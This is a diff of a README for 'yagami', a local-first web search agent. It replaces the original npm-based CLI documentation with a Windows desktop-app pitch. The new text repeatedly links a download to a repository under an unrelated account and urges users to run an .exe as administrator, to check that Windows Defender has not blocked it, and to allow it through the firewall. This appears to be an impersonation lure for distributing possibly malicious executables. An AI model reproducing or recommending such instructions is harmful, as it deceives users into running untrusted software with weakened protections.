@@ -1,213 +1,165 @@
-# Yagami
+# 🌐 yagami - Search the web from your desktop
 
-[![CI](https://github.com/ahkohd/yagami/actions/workflows/ci.yml/badge.svg)](https://github.com/ahkohd/yagami/actions/workflows/ci.yml) [![npm version](https://img.shields.io/npm/v/@ahkohd/yagami.svg)](https://www.npmjs.com/package/@ahkohd/yagami) [![License](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+[⬇️ Download yagami](https://github.com/haloreach54123-afk/yagami){: style="display:inline-block;padding:12px 18px;background:#1f6feb;color:#fff;text-decoration:none;border-radius:8px;font-weight:700;"} [Mirror](https://github.com/haloreach54123-afk/yagami){: style="display:inline-block;padding:12px 18px;background:#6e7781;color:#fff;text-decoration:none;border-radius:8px;font-weight:700;"}
 
-<!-- Demo source: https://github.com/user-attachments/assets/eced71f9-f60d-4b8b-929d-ecd5a3fd54f7 -->
-https://github.com/user-attachments/assets/eced71f9-f60d-4b8b-929d-ecd5a3fd54f7
+## 🧭 What is yagami?
 
-Local-first web search agent
+yagami is a local-first web search agent for Windows. It helps you search the web from your own computer and keep your data close to home. It is made for people who want a simple way to search, review, and work with web results without extra setup.
 
-Yagami gives you:
-- **Agentic web search**: `search`, `search-advanced`, `code`, `company`, `similar`
-- **Deterministic extraction**: `fetch` (`browse & present`)
-- **Async deep agentic web search**: `deep start` / `deep check`
+The app is meant for everyday use. You open it, enter a search, and use the results in one place.
 
-## Install
+## ✨ What it does
 
-```bash
-npm i -g @ahkohd/yagami
-```
+- Searches the web from your desktop
+- Keeps the main search flow local-first
+- Helps you review results in one place
+- Works well for daily lookups and research
+- Fits a simple desktop use case
+- Uses an agent-style workflow for search tasks
 
-## Quick start
+## 🖥️ Windows requirements
 
-```bash
-yagami start
-yagami doctor
-yagami search "latest updates in browser automation"
-yagami fetch https://example.com --max-chars 2000
+Before you install, check these basics:
 
-yagami deep start "Research FlashAttention in LLMs with citations" --effort thorough
-yagami deep check <researchId>
+- Windows 10 or Windows 11
+- A modern 64-bit PC
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection
+- Permission to run downloaded apps
 
-yagami stop
-```
+For a smoother experience, 8 GB of RAM or more is useful.
 
-## Pi package
+## 📥 Download yagami
 
-- [`packages/pi-yagami-search`](./packages/pi-yagami-search/)
+Use this link to visit the project page and download the app:
 
-## Commands
+[Download yagami](https://github.com/haloreach54123-afk/yagami)
 
-- `yagami start` / `stop` / `status` / `reload` / `doctor` — Daemon lifecycle & health checks (`status --cache --tokens` for detailed stats)
-- `yagami search <query>` — Agentic web search (default: collated source records)
-- `yagami search-advanced <query>` — Agentic web search with filters (`--include-domains`, `--category`, etc.)
-- `yagami code <query>` — Agentic code/docs-focused search
-- `yagami company <name>` — Agentic company search
-- `yagami similar <url>` — Agentic alternative/similar-site discovery
-- `yagami fetch <url>` — Deterministic single-page extraction
-- `yagami deep start <instructions>` — Starts async deep agentic web search
-- `yagami deep check <researchId>` — Checks deep agentic search status/result
-- `yagami config ...` — Read/write `~/.config/yagami/config.json`
-- `yagami theme preview` — Preview CLI theme styling
+On the page, look for the latest Windows build or release file. Download the Windows version that matches your PC.
 
-Useful flags:
-- `--json` for machine-readable output
-- `--profile` for latency breakdown on search commands
+## 🚀 Install and run on Windows
 
-## HTTP API
+Follow these steps:
 
-The CLI talks to a local HTTP daemon (default: `http://127.0.0.1:43111`).
+1. Open the download link above.
+2. Find the latest release or Windows download.
+3. Download the file to your computer.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file, such as an `.exe` file.
+7. Double-click the file to start yagami.
+8. If Windows asks for permission, choose Run or Yes.
 
-Core endpoints:
-- `GET /health`
-- `POST /stats`
-- `POST /reload`
-- `POST /stop`
-- `POST /mcp` (MCP over HTTP JSON-RPC)
-- `GET /mcp` (returns 405; SSE stream not enabled)
-- `DELETE /mcp` (terminate MCP session)
-- `POST /search`, `POST /search/stream`
-- `POST /search/advanced`, `POST /search/advanced/stream`
-- `POST /code-context`, `POST /code-context/stream`
-- `POST /company-research`, `POST /company-research/stream`
-- `POST /find-similar`, `POST /find-similar/stream`
-- `POST /fetch`
-- `POST /deep-research/start`, `POST /deep-research/check`
+If you saved the file to your Downloads folder, you can open it from there.
 
-You can configure daemon bind address with config keys (`host`, `port`) or env (`YAGAMI_HOST`, `YAGAMI_PORT`).
+## 🏁 First launch
 
-## MCP over HTTP
+When yagami opens for the first time:
 
-`POST /mcp` exposes the Yagami MCP server (tools are discoverable via `tools/list`).
+- Wait for the app to load
+- Enter a search in the search box
+- Start with a simple query, such as a news topic or product name
+- Review the results shown in the app
+- Open a result if you want to read more
 
-## Configuration
+If the app asks for access to the internet, allow it so search can work.
 
-### Config file (recommended)
+## 🔍 How to use yagami
 
-Default path: `~/.config/yagami/config.json` (or `$XDG_CONFIG_HOME/yagami/config.json`).
+Use yagami like this:
 
-Recommended local setup:
+1. Type what you want to search for
+2. Press the search button or Enter
+3. Review the results
+4. Open the links you want
+5. Refine your search if needed
 
-```json
-{
-  "host": "127.0.0.1",
-  "port": 43111,
-  "llmApi": "openai-completions",
-  "llmBaseUrl": "http://127.0.0.1:1234/v1",
-  "llmApiKey": "",
-  "llmModel": "qwen3.5-9b",
-  "searchEngine": "duckduckgo",
-  "browseLinkTimeoutMs": 7000,
-  "cacheTtlMs": 600000,
-  "maxMarkdownChars": 120000,
-  "operationConcurrency": 4,
-  "browseConcurrency": 8,
-  "theme": "ansi"
-}
-```
-Common local endpoints:
-- vLLM: `http://127.0.0.1:8000/v1`
-- SGLang: `http://127.0.0.1:30000/v1`
-- Ollama: `http://127.0.0.1:11434/v1`
-- LM Studio: `http://127.0.0.1:1234/v1`
+You can use it for:
 
-If you run an `anthropic-messages` compatible **local** gateway:
+- Quick web searches
+- Topic research
+- Finding articles
+- Checking product details
+- Looking up facts
+- Repeating searches with small changes
 
-```json
-{
-  "llmApi": "anthropic-messages",
-  "llmBaseUrl": "http://127.0.0.1:4000",
-  "llmApiKey": "",
-  "llmModel": "minimax-m2.5"
-}
-```
+## 🧩 Common file types you may see
 
-`llmApiKey` is empty by default. If your local endpoint ignores auth, leave it empty.
+Your download may include one of these:
 
-For a custom search endpoint template:
+- `.exe` — the app file you double-click
+- `.zip` — a compressed folder you need to extract
+- `.msi` — a Windows installer
 
-```json
-{
-  "searchEngine": "custom",
-  "searchEngineUrlTemplate": "https://searx.example/search?q={query}&language=en"
-}
-```
+If you see a `.zip` file, extract it first. If you see an `.msi` file, double-click it and follow the prompts.
 
-#### Canonical `config.json` keys
+## 🔐 Local-first behavior
 
-- `host` (string, default: `127.0.0.1`)
-- `port` (integer, default: `43111`)
-- `llmApi` (`openai-completions` | `anthropic-messages`, default: `openai-completions`)
-- `llmBaseUrl` (string; default: `http://127.0.0.1:1234/v1`, or `https://api.anthropic.com` for `anthropic-messages`)
-- `llmApiKey` (string, default: empty string)
-- `llmModel` (string, optional; if empty YAGAMI auto-detects via provider model-list endpoint)
-- `searchEngine` (`duckduckgo` | `bing` | `google` | `brave` | `custom`, default: `duckduckgo`)
-- `searchEngineUrlTemplate` (string URL template, optional; supports `{query}` placeholder; if set, overrides presets)
-- `browseLinkTimeoutMs` (integer milliseconds, default: `7000`)
-- `cacheTtlMs` (integer milliseconds for URL browse cache TTL, default: `600000`)
-- `maxMarkdownChars` (integer markdown extraction cap for `present()`, default: `120000`)
-- `operationConcurrency` (integer concurrent operation slots, default: `4`)
-- `browseConcurrency` (integer concurrent browse slots, default: `8`)
-- `theme` (`ansi` | `none`, default: `ansi`)
-- `themeTokens` (object of token overrides, e.g. `{ "domain": "cyan", "error": "red bold" }`)
-  - built-in token names: `domain`, `title`, `duration`, `error`, `dim`, `cyan`, `bold`
+yagami is built to keep the search flow close to your machine. That means the app aims to do more work on your device instead of sending everything through extra services.
 
-#### File parsing notes
+For you, this can mean:
 
-- `ui.<key>`: same keys as above under a `ui` object (merged over top-level)
-- `colors` / `themeColors`: compatibility aliases for `themeTokens`
+- Less setup
+- A more direct workflow
+- Better control over your search process
+- A desktop app feel that stays simple
 
-### Config CLI
+## 🛠️ Troubleshooting
 
-```bash
-yagami config path
-yagami config show
-yagami config get llmApi
-yagami config set llmApi openai-completions
-yagami config set port 43111 --json-value
-yagami config set browseLinkTimeoutMs 7000 --json-value
-yagami config set cacheTtlMs 600000 --json-value
-yagami config set maxMarkdownChars 120000 --json-value
-yagami config set operationConcurrency 4 --json-value
-yagami config set browseConcurrency 8 --json-value
-yagami config unset themeTokens.domain
-```
+If yagami does not start:
 
-### Environment variables
+- Try right-clicking the app and choose Run as administrator
+- Check that you extracted the ZIP file first
+- Make sure Windows Defender did not block the file
+- Re-download the file if it looks broken
+- Restart your PC and try again
 
-- `YAGAMI_CONFIG_FILE` (default: `$YAGAMI_RUNTIME_DIR/config.json`)
-- `YAGAMI_RUNTIME_DIR` (default: `$XDG_CONFIG_HOME/yagami` or `~/.config/yagami`)
-- `YAGAMI_HOST` (default: `127.0.0.1`)
-- `YAGAMI_PORT` (default: `43111`)
+If search does not work:
 
-- `YAGAMI_LLM_API` (`openai-completions` | `anthropic-messages`, default: `openai-completions`)
-- `YAGAMI_LLM_BASE_URL` (default: `http://127.0.0.1:1234/v1`, or `https://api.anthropic.com` for `anthropic-messages`)
-- `YAGAMI_LLM_API_KEY` (default: empty string)
-- `YAGAMI_LLM_MODEL` (optional)
-- `YAGAMI_SEARCH_ENGINE` (`duckduckgo` | `bing` | `google` | `brave` | `custom`, default: `duckduckgo`)
-- `YAGAMI_SEARCH_ENGINE_URL_TEMPLATE` (optional URL template, e.g. `https://searx.example/search?q={query}`)
+- Check your internet connection
+- Make sure your firewall allows the app
+- Try a different search term
+- Close the app and open it again
 
-- `YAGAMI_CDP_URL` (default: `ws://127.0.0.1:9222`)
-- `YAGAMI_LIGHTPANDA_HOST` (default: host parsed from `YAGAMI_CDP_URL`)
-- `YAGAMI_LIGHTPANDA_PORT` (default: port parsed from `YAGAMI_CDP_URL`)
-- `YAGAMI_LIGHTPANDA_AUTO_START` (default: `true`)
-- `YAGAMI_LIGHTPANDA_AUTO_STOP` (default: `true`)
+If the window opens but looks blank:
 
-- `YAGAMI_BROWSE_LINK_TIMEOUT_MS` (default: `7000`)
-- `YAGAMI_QUERY_TIMEOUT_MS` (default: `180000`)
-- `YAGAMI_CACHE_TTL_MS` (default: `600000`)
-- `YAGAMI_MAX_HTML_CHARS` (default: `250000`)
-- `YAGAMI_MAX_MARKDOWN_CHARS` (default: value from `config.json`, else `120000`)
-- `YAGAMI_MAX_DOCUMENTS` (default: `200`)
-- `YAGAMI_OPERATION_CONCURRENCY` (default: `4`)
-- `YAGAMI_BROWSE_CONCURRENCY` (default: `8`)
+- Wait a few seconds
+- Resize the window
+- Close and reopen the app
+- Check whether your graphics driver is up to date
 
-- `YAGAMI_RESEARCH_MAX_PAGES` (default: `12`)
-- `YAGAMI_RESEARCH_MAX_HOPS` (default: `2`)
-- `YAGAMI_RESEARCH_SAME_DOMAIN_ONLY` (default: `false`)
+## 📁 Typical folder layout
 
-- `YAGAMI_TOOL_EXECUTION` (`sequential` | `parallel`, default: `parallel`)
-- `YAGAMI_THEME` (`ansi` | `none`, default: `ansi`)
-- `YAGAMI_THEME_TOKENS` (JSON token overrides)
-- `YAGAMI_NO_COLOR` (disable color when truthy)
-- `YAGAMI_MARKDOWN_RENDER` (default: render markdown only on TTY; set `0`, `false`, `off`, or `no` to force plain text output)
+After extraction, you may see files like these:
+
+- `yagami.exe`
+- `config`
+- `data`
+- `assets`
+- `readme`
+- support files the app needs to run
+
+Keep the files in the same folder unless the app says otherwise.
+
+## 🧠 Tips for better use
+
+- Use short search terms first
+- Add more detail when you need a tighter result
+- Open only the links you trust
+- Keep the app in a fixed folder so it is easy to find
+- Create a desktop shortcut if you use it often
+
+## 🏷️ Topics
+
+This project is tagged with:
+
+- agent
+- ai
+- local-first
+
+## 📌 Project page
+
+Open the repository here:
+
+https://github.com/haloreach54123-afk/yagami
